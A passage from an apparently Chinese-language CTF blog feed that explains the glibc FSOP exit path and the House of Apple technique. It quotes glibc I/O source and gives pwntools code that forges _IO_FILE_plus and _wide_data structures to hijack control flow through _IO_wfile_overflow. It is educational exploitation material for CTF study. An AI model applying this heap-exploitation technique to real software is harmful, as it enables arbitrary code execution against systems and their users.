class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pointer_guard.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libc-lock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set-freeres.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"exit.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initialize the flag that indicates exit function processing</span></span><br><span class="line"><span class="comment">   is complete. See concurrency notes in stdlib/exit.h where</span></span><br><span class="line"><span class="comment">   __exit_funcs_lock is declared.  */</span></span><br><span class="line"><span class="type">bool</span> __exit_funcs_done = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call all functions registered with `atexit' and `on_exit',</span></span><br><span class="line"><span class="comment">   in the reverse of the order in which they were registered</span></span><br><span class="line"><span class="comment">   perform stdio cleanup, and terminate program execution with STATUS.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line">  <span class="keyword">if</span> (run_dtors)</span><br><span class="line">    call_function_static_weak (__call_tls_dtors);</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit' and `on_exit'. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    {</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">    restart:</span><br><span class="line">      cur = *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    {</span><br><span class="line">      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line">      arg = f-&gt;func.on.arg;</span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      onfct (status, arg);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      atfct ();</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">      arg = f-&gt;func.cxa.arg;</span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      cxafct (arg, status);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">    <span class="keyword">goto</span> restart;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don't free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    call_function_static_weak (_IO_cleanup);</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">{</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">}</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="io_cleanup">_IO_cleanup()</h3><p>在<code>__run_exit_handlers</code> 中调用了<code>_IO_cleanup</code>，它在 <code>/libio/genops.c</code> 中有定义:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don't have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they're supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="io_flush_all">_IO_flush_all()</h3><p>同样在这个文件中，可以找到<code>_IO_flush_all</code>:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all (<span class="type">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    {</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_cthreads_flockfile (FILE *fp)</span><br><span class="line">{</span><br><span class="line">  _IO_lock_lock (*fp-&gt;_lock);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _IO_flockfile (FILE *)</span><br><span class="line">     __attribute__ ((alias (<span class="string">"_cthreads_flockfile"</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></tbody></table></figure><p><code>_IO_FILE_plus</code> 在 <code>/libio/stdfiles.c</code> 有定义</p><p>主要关注这个函数中的判断条件，如果前面的条件<strong>满足</strong>，会进入<code>_IO_OVERFLOW (fp, EOF)</code>，这是一个宏定义，位于 <code>/libio/libioP.h</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of MEMBER in struct type TYPE.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing</span></span><br><span class="line"><span class="comment">   violation in case THIS has a different pointer type.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void  +*) &amp;_IO_JUMPS_FILE_plus (THIS)\</span></span><br><span class="line"><span class="meta">     + (THIS)-&gt;_vtable_offset)))</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">IO_validate_vtable (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">{</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果通过<strong>合法性检查</strong>，那么会执行<code>_vtable-&gt;__overflow</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里<code>__overflow</code> 是<code>_IO_jump_t vtable</code> 中的虚函数，这是 GLIBC 中实现 I/O 多态的核心机制</p><h4 id="vtable2">vtable<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></h4><p>通过虚函数表（vtable）为不同类型的文件流（如文件、内存流、字符串流）提供统一的接口，同时允许不同流类型自定义底层操作（如读、写、缓冲区管理）。</p><p>我们可以在 <code>/libio/vtables.c</code> 中找到相关的定义。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> __<span class="title">io_vtables</span>[] <span class="title">attribute_relro</span> =</span></span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* _IO_str_jumps  */</span></span><br><span class="line">  [IO_STR_JUMPS] =</span><br><span class="line">  {</span><br><span class="line">JUMP_INIT_DUMMY,</span><br><span class="line">    JUMP_INIT (finish, _IO_str_finish),</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  },</span><br><span class="line">  [IO_WSTR_JUMPS] = {</span><br><span class="line">JUMP_INIT_DUMMY,</span><br><span class="line">    JUMP_INIT (finish, _IO_wstr_finish),</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  },</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>也就是说，<code>__overflow</code>实际是执行<code>__io_vtables</code> 中已定义的相关函数。如 <code>finish</code>，会根据不同 I/O 类型执行不同函数，例如 <code>[IO_STR_JUMPS]</code> 中指向<code>_IO_str-finish</code>；<code>[IO_WSTR_JUMPS]</code> 中指向<code>_IO_wstr_finish</code>。</p><h1 id="iii.-house-of-apple">III. House of Apple</h1><p>在上一节中，我们知道在<code>_IO_JUMPS_FUNC(THIS)</code> 这个宏中验证了 <code>const struct _IO_jump_t *vtable</code> 是否是合法的：即它指向的地址是否在<code>__io_vtables</code> 的范围内。这也让我们不能通过直接伪造 <code>vtable</code> 来控制程序执行流。</p><p>然而，我们仍有机会修改 <code>vtable</code> 为不同的合法虚表。这导致了后续函数执行过程中存在可利用的漏洞。</p><h2 id="构造_io_file_plus">构造<code>_IO_FILE_plus</code></h2><p>使用 House of Apple 的前提是 Large binattack，它将一个堆地址写在任意地址处。</p><p>这里将 <code>&amp;_IO_list_all</code> 处写可控堆地址，然后开始伪造<code>_IO_FILE_plus</code>。</p><p>由于 Large binattack 是把堆的头部 <code>prev_size</code> 地址写入，而一般我们只能从 <code>fd</code> 域开始编辑，所以下文的伪造会从 <code>fd</code> 开始。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_io = flat({</span><br><span class="line"><span class="number">0x18</span>:[</span><br><span class="line">p64(<span class="number">1</span>) <span class="comment"># _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0x60</span>:[</span><br><span class="line">p32(<span class="number">0</span>) <span class="comment"># _fileno</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0x78</span>:[</span><br><span class="line">p64(_IO_stdfile_2_lock) <span class="comment"># *_lock [_IO_flockfile (fp);]</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0xb0</span>:[</span><br><span class="line">p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode [fp-&gt;_mode &lt;= 0]</span></span><br><span class="line">]</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><h2 id="wide_data调用链"><code>_wide_data</code> 调用链</h2><p>尽管无法直接通过修改 <code>vtable</code> 控制执行流，但是<code>_wide_data-&gt;_wide_vtable</code> 在执行时缺少安全检查。</p><p>因此我们可以构造如下调用链，其中涉及到的方法和宏可自行查阅：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_OVERFLOW (fp, EOF)-&gt;</span><br><span class="line">(_IO_overflow_t) _IO_wfile_overflow-&gt;</span><br><span class="line">_IO_wdoallocbuf (f)-&gt;</span><br><span class="line">_IO_WDOALLOCATE (fp)-&gt;</span><br><span class="line">Backdoor(fp) # fake vtable points at</span><br></pre></td></tr></tbody></table></figure><h2 id="构造_wide_data-_wide_vtable">构造<code>_wide_data</code>,<code>_wide_vtable</code></h2><p>为了使用上面的调用链，需要修改 <code>*_wide_data</code> 到我们伪造的<code>_IO_wide_data</code>。</p><p>这里有一个巧妙的处理，我们可以将其指向之前伪造的<code>_IO_FILE_plus</code> 处，因为<code>_IO_wide_data</code> 中部分成员是与<code>_IO_FILE</code> 相同的。</p><p>然后在<code>_wide_data-&gt;_wide_vtable</code> 处写构造的 vtable 地址。</p><p><img src="\glibcFSOP/image-20250408191324901.png"></p><figure><img src="glibcFSOP/image-20250408193602020.png" alt="image-20250408193602020"><figcaption aria-hidden="true">image-20250408193602020</figcaption></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_IO_stdfile_2_lock = libc_base + <span class="number">0x205700</span> <span class="comment"># find your offset in gdb</span></span><br><span class="line">IO_file_addr = heap_base + <span class="number">0x0d00</span></span><br><span class="line">IO_wide_data_addr = IO_file_addr</span><br><span class="line">wide_vtable_addr = file_addr + <span class="number">0xe8</span>-<span class="number">0x68</span> </span><br><span class="line"></span><br><span class="line">fake_io = flat({</span><br><span class="line"><span class="number">0x18</span>:[</span><br><span class="line">p64(<span class="number">1</span>) <span class="comment"># _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0x60</span>:[</span><br><span class="line">p32(<span class="number">0</span>) <span class="comment"># _fileno</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0x78</span>:[</span><br><span class="line">p64(_IO_stdfile_2_lock) <span class="comment"># *_lock [_IO_flockfile (fp);]</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0x90</span>:[</span><br><span class="line">p64(IO_wide_data_addr) <span class="comment"># *_wide_data</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0xb0</span>:[</span><br><span class="line">p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode [fp-&gt;_mode &lt;= 0]</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0xc8</span>:[</span><br><span class="line">p64(libc_base+libc.sym[<span class="string">'_IO_wfile_jumps'</span>]) <span class="comment"># vtable</span></span><br><span class="line">],</span><br><span class="line"><span class="number">0xd0</span>:[</span><br><span class="line">p64(wide_vtable_addr)</span><br><span class="line">],</span><br><span class="line"><span class="number">0xd8</span>:[</span><br><span class="line">p64(gadget)</span><br><span class="line">]</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>这样，就控制了程序执行流，并且 <code>$rdi = &amp;fp</code>。</p><p>对于 House of Apple 的实践，您也可以阅读我的这篇文章：<a href="https://summ2.link/2025/02/18/2025218-HGAME-2025-Week-2-Writeup/#where-is-the-vulnerability">HGAME2025 Week 2 Writeup</a></p><h1 id="references">References</h1><section id="footnotes" class="footnotes footnotes-end-of-document" role="doc-endnotes"><hr><ol><li id="fn1"><p><a href="https://bbs.kanxue.com/thread-273832.htm">看雪：House of apple一种新的 glibc 中 IO 攻击方法</a><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2"><p><a href="https://bbs.kanxue.com/thread-274625.htm">看雪：Pwn 堆利用学习 ——FSOP、House of Orange</a><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;i.-fsop&quot;&gt;I. FSOP&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;FSOP 是 File Stream Oriented Programming 的缩写。&lt;/p&gt;
&lt;p&gt;FSOP 的核心思想就是劫持
&lt;code&gt;_IO_list_all&lt;/code&gt; 的值来伪造链表和其中的
&lt;code&gt;_IO_FILE&lt;/code&gt; 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP
选择的触发方法是调用&lt;code&gt;_IO_flush_all_lockp&lt;/code&gt;，这个函数会刷新&lt;code&gt;_IO_list_all&lt;/code&gt; 链表中所有项的文件流，相当于对每个
FILE 调用
fflush，也对应着会调用&lt;code&gt;_IO_FILE_plus.vtable&lt;/code&gt; 中的&lt;code&gt;_IO_overflow&lt;/code&gt;。</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="FSOP" scheme="http://summ2.link/tags/FSOP/"/>
    
    <category term="House of Apple" scheme="http://summ2.link/tags/House-of-Apple/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2025 Final 复现</title>
    <link href="http://summ2.link/categories/CTF/hgame-2025-final/"/>
    <id>http://summ2.link/categories/CTF/hgame-2025-final/</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-05-08T04:14:30.425Z</updated>
    
